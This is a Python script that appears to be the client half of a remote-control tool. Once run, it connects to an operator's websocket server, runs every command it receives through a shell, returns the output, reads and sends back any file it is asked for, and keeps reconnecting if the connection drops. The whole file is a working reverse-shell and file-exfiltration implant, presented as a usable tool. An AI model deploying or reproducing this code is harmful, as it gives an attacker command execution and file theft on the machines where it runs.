import sys
import argparse
import asyncio
import websockets
import subprocess
import os
import time
import logging
from decoder import decode_unicode_string
from colorama import init, Fore

init()

session = ""

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

async def connect_to_websocket(url, room, retry_interval, debug,output_filename):
    global session
    while True:
        try:
            uri = f"wss://{url}"
            if room:
                uri += f"/{room}"
            async with websockets.connect(uri) as websocket:
                await websocket.send(f"servant:{room}")

                while True:
                    message_from_master = await websocket.recv()

                    message_from_master = decode_unicode_string(message_from_master)
                    if debug:
                        logger.debug(f"Received Command {message_from_master}")

                    if message_from_master.rstrip().strip() == "clear-session":
                        session = ""
                        servant_response = "terminal session cleared"
                    elif message_from_master.startswith("send-file"):
                        # Handle sending a file
                        _, file_path = message_from_master.split(" ", 1)
                        await send_file(websocket, file_path)
                    else:
                        session += f" && {message_from_master} "
                        if debug:
                            logger.debug(f"Executing {message_from_master}")

                        result = subprocess.run(
                            message_from_master,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True,
                        )

                        with open(output_filename, "w") as output_file:
                            output_file.write(result.stdout)
                            output_file.write(result.stderr)

                        with open(output_filename, "r") as output_file:
                            await websocket.send(output_file.read())
                        os.remove(output_filename)
                        
        except (websockets.exceptions.ConnectionClosed, OSError) as e:
            if debug:
                logger.debug(f"Error: {e}. Reconnecting in {retry_interval} seconds...")
            time.sleep(retry_interval)

async def send_file(websocket, file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
            await websocket.send(file_data)
    except FileNotFoundError:
        await websocket.send("File not found.")

def parse_args():
    parser = argparse.ArgumentParser(description="WebSocket client with retrying and room support")
    parser.add_argument("--url", required=True, help="WebSocket server URL")
    parser.add_argument("--room", default="", help="Room identifier")
    parser.add_argument("--retry-interval", type=int, default=5, help="Retry interval in seconds")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--output-filename", default="dump", help="Output filename for subprocess results")
    return parser.parse_args()

async def main():
    args = parse_args()
    await connect_to_websocket(args.url, args.room, args.retry_interval, args.debug,args.output_filename)

if __name__ == "__main__":
    asyncio.run(main())
